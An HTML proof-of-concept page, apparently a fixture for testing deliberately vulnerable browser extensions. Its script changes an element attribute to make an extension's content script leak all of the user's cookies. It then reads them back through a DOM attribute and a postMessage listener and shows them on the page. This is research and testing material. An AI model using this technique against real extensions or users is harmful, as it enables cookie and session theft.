<!DOCTYPE html>
<html>
	<head>
		<title>A malicious website</title>
	</head>
	<body>

		<h1>A malicious website</h1>

		<!-- (a) /vuln01_weak_mv3_dom & (b) /vuln01_weak_mv3_dom_and_postMessage -->
		<!--
		The content script of this extension leaks sensitive data that it received from the service worker (namely all of the user's cookies)
		(a) into the DOM of a (potentially malicious) website (namely into an attribute called "cookies" of an element with id "some-id"), or
		(b) to a (potentially malicious) website via a postMessage,
		after this website triggers a very certain DOM event (namely changing an attribute called "data-some-attr" of an element with id "some-id").
		-->
		<span id="some-id" data-some-attr="foo">This is a totally benign piece of text.</span><br/>
		<span id="cookies"></span>
		<script>
			setTimeout(function() {
				// Trigger a DOM event and therefore trigger the vulnerable extension (/vuln01_weak_mv3_dom) to leak sensitive data
				//     (into a newly created "cookies" attribute of the "some-id" <span> element):
				document.getElementById('some-id').setAttribute("data-some-attr", "bar");
			}, 100);

			// (a) /vuln01_weak_mv3_dom:
			setTimeout(function() {
				// Access the leaked sensitive data:
				if (document.getElementById('some-id').hasAttribute("cookies")) {
					let leaked_cookie_data = document.getElementById('some-id').getAttribute("cookies");
					document.getElementById('cookies').innerText = "Leaked cookie data (received via DOM): "
						+ leaked_cookie_data.substring(0, 1000) + " ... " + leaked_cookie_data.substring(leaked_cookie_data.length-1000);
				}
			}, 300);

			// (b) /vuln01_weak_mv3_dom_and_postMessage:
			window.addEventListener('message', event => {
				if (event.data && event.data.type == "FROM_EXTENSION") {
					let leaked_cookie_data = JSON.stringify(event.data);
					document.getElementById('cookies').innerText = "Leaked cookie data (received via postMessage): "
						+ leaked_cookie_data.substring(0, 1000) + " ... " + leaked_cookie_data.substring(leaked_cookie_data.length-1000);
				}
			});
		</script>

	</body>
</html>
